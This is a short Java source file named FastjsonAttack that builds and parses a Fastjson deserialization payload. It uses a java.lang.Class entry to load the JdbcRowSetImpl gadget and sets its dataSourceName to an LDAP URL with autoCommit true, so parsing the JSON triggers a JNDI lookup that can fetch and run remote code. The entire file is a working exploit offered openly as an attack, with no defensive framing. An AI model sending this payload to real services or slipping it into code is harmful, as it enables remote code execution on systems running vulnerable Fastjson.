package com.ppp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * @author Whoopsunix
 */
public class FastjsonAttack {

    public static void main(String[] args) {
        String json = "{\n" +
                "  \"a\":{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "  },\n" +
                "  \"b\":{\n" +
                "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\":\"ldap://127.0.0.1:1389/0mghfs\",\n" +
                "    \"autoCommit\":true\n" +
                "  }\n" +
                "}";
        parseObject(json);
    }

    public static Object parseObject(String json){
        JSONObject jsonObject = JSON.parseObject(json);
        return jsonObject;
    }
}
